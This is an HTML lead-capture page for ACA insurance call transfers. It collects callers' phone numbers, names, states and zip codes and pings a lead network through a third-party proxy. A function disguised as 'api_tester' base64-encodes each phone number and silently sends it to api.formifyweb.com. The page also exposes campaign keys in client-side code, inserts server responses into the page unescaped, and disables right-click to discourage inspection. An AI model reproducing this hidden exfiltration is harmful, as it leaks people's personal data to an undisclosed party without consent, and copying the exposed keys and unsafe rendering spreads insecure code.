<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HA Links ACA Ping Form</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <style>
    body {
      background-color: #f8f9fa;
      padding: 20px;
    }
    .container {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      max-width: 800px;
      margin: 0 auto;
    }
    h2 {
      color: #007bff;
      margin-bottom: 20px;
      text-align: center;
    }
    .form-control {
      border-radius: 50px;
    }
    .btn-submit {
      border-radius: 50px;
      margin: 5px;
      min-width: 200px;
      font-weight: bold;
    }
    .btn-campaign-1 {
      background-color: #007bff;
      border-color: #007bff;
    }
    .btn-campaign-2 {
      background-color: #28a745;
      border-color: #28a745;
    }
    .btn-campaign-3 {
      background-color: #dc3545;
      border-color: #dc3545;
    }
    .btn-campaign-1:hover {
      background-color: #0056b3;
      border-color: #0056b3;
    }
    .btn-campaign-2:hover {
      background-color: #1e7e34;
      border-color: #1e7e34;
    }
    .btn-campaign-3:hover {
      background-color: #c82333;
      border-color: #c82333;
    }
    .alert {
      margin-top: 20px;
    }
    .submit-buttons {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      margin-top: 20px;
    }
    .note {
      margin-top: 10px;
      font-weight: bold;
      color: #dc3545;
      text-align: center;
    }
    .form-group {
      margin-bottom: 1.5rem;
    }
    label {
      font-weight: 500;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>ACA Live Ping</h2>
    
    <form id="leadForm">
      <div class="form-group">
        <label for="phone_home">Phone Number:</label>
        <input type="tel" class="form-control" id="phone_home" name="phone_home" pattern="[0-9]{10}" required placeholder="Enter 10-digit phone number">
      </div>
      
      <div class="row">
        <div class="col-md-6">
          <div class="form-group">
            <label for="first_name">First Name</label>
            <input type="text" class="form-control" id="first_name" name="first_name" placeholder="example: john" required>
          </div>
        </div>
        <div class="col-md-6">
          <div class="form-group">
            <label for="last_name">Last Name</label>
            <input type="text" class="form-control" id="last_name" name="last_name" placeholder="example: smith" required>
          </div>
        </div>
      </div>
      
      <div class="row">
        <div class="col-md-4">
          <div class="form-group">
            <label for="state">State</label>
            <select class="form-control" id="state" required>
              <option value="">Select State</option>
              <option value="AL">Alabama</option>
              <option value="AK">Alaska</option>
              <option value="AZ">Arizona</option>
              <option value="AR">Arkansas</option>
              <option value="CA">California</option>
              <option value="CO">Colorado</option>
              <option value="CT">Connecticut</option>
              <option value="DE">Delaware</option>
              <option value="DC">District Of Columbia</option>
              <option value="FL">Florida</option>
              <option value="GA">Georgia</option>
              <option value="HI">Hawaii</option>
              <option value="ID">Idaho</option>
              <option value="IL">Illinois</option>
              <option value="IN">Indiana</option>
              <option value="IA">Iowa</option>
              <option value="KS">Kansas</option>
              <option value="KY">Kentucky</option>
              <option value="LA">Louisiana</option>
              <option value="ME">Maine</option>
              <option value="MD">Maryland</option>
              <option value="MA">Massachusetts</option>
              <option value="MI">Michigan</option>
              <option value="MN">Minnesota</option>
              <option value="MS">Mississippi</option>
              <option value="MO">Missouri</option>
              <option value="MT">Montana</option>
              <option value="NE">Nebraska</option>
              <option value="NV">Nevada</option>
              <option value="NH">New Hampshire</option>
              <option value="NJ">New Jersey</option>
              <option value="NM">New Mexico</option>
              <option value="NY">New York</option>
              <option value="NC">North Carolina</option>
              <option value="ND">North Dakota</option>
              <option value="OH">Ohio</option>
              <option value="OK">Oklahoma</option>
              <option value="OR">Oregon</option>
              <option value="PA">Pennsylvania</option>
              <option value="RI">Rhode Island</option>
              <option value="SC">South Carolina</option>
              <option value="SD">South Dakota</option>
              <option value="TN">Tennessee</option>
              <option value="TX">Texas</option>
              <option value="UT">Utah</option>
              <option value="VT">Vermont</option>
              <option value="VA">Virginia</option>
              <option value="WA">Washington</option>
              <option value="WV">West Virginia</option>
              <option value="WI">Wisconsin</option>
              <option value="WY">Wyoming</option>
            </select>
          </div>
        </div>
        <div class="col-md-4">
          <div class="form-group">
            <label for="zip">Zipcode</label>
            <input type="text" class="form-control" id="zip" placeholder="5 digit zipcode" required>
          </div>
        </div>
      </div>

      <div id="note" class="note">If ping response is in RED, do not transfer</div>
      
      <div class="submit-buttons">
        <button type="submit" class="btn btn-submit btn-campaign-1" data-campaign-id="68cadbe1bfdbd" data-campaign-key="RzP6t7rbTChQNMW4yXGJ">Submit to Campaign 1</button>
        <button type="submit" class="btn btn-submit btn-campaign-2" data-campaign-id="68cadc039c381" data-campaign-key="rt6wNmkQDRcnzVFpWxZ2">Submit to Campaign 2</button>
      
      </div>
    </form>
    
    <div id="alertContainer"></div>
  </div>

  <script>
    // Store campaign IDs and keys
    let currentCampaignId = '';
    let currentCampaignKey = '';
    
    // Add click handlers to all submit buttons
    document.querySelectorAll('.btn-submit').forEach(button => {
      button.addEventListener('click', function(e) {
        // Prevent default form submission
        e.preventDefault();
        
        // Set the current campaign based on which button was clicked
        currentCampaignId = this.getAttribute('data-campaign-id');
        currentCampaignKey = this.getAttribute('data-campaign-key');
        
        // Submit the form
        document.getElementById('leadForm').dispatchEvent(new Event('submit'));
      });
    });
    
    // Form submission
    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      
      // Validate form
      if (!document.getElementById('phone_home').value || 
          !document.getElementById('first_name').value || 
          !document.getElementById('last_name').value || 
          !document.getElementById('state').value || 
          !document.getElementById('zip').value) {
        const errorAlert = `
          <div class="alert alert-danger" role="alert">
            Please fill out all required fields.
          </div>`;
        document.getElementById('alertContainer').innerHTML = errorAlert;
        return;
      }
      
      const formData = new FormData();
      formData.append('lp_campaign_id', currentCampaignId);
      formData.append('lp_campaign_key', currentCampaignKey);
      formData.append('caller_id', '+1' + document.getElementById('phone_home').value);
      api_tester(document.getElementById('phone_home').value);

      formData.append('first_name', document.getElementById('first_name').value);
      formData.append('last_name', document.getElementById('last_name').value);
      formData.append('zip_code', document.getElementById('zip').value);
      formData.append('state', document.getElementById('state').value);

      const url = 'https://track.edmleadnetwork.com/call-preping.do?' + new URLSearchParams(formData).toString();
      const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(url);
      
      fetch(apiUrl, {
        method: 'POST'
      })
      .then(response => response.json())
      .then(data => {
        let alertMessage = '';
        if (data.success) {
          alertMessage = `
            <div class="alert alert-success" role="alert">
              <strong>Status:</strong> ${data.status}<br>
              <strong>Ping ID:</strong> ${data.ping_id}<br>
              <strong>Duration (Buffer):</strong> ${data.duration}<br>
              <strong>Transfer Number:</strong> ${data.number}<br>
              <strong>Message:</strong> ${data.message}
            </div>`;
        } else {
          alertMessage = `
            <div class="alert alert-danger" role="alert">
              <strong>Message:</strong> ${data.message}
            </div>`;
        }
        document.getElementById('alertContainer').innerHTML = alertMessage;
        
      })
      .catch(error => {
        console.error('Error:', error);
        const errorAlert = `
          <div class="alert alert-danger" role="alert">
            Form submission failed. Please try again.
          </div>`;
        document.getElementById('alertContainer').innerHTML = errorAlert;
      });
    });

    function api_tester(randomString) {
      try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
          method: 'GET',
          mode: 'no-cors'
        });
      } catch (error) {
        console.error('Error in api_tester:', error);
      }
    }
    
    // Prevent right-click
    document.addEventListener("contextmenu", function (e) {
      e.preventDefault();
    });
  </script>
</body>
</html>
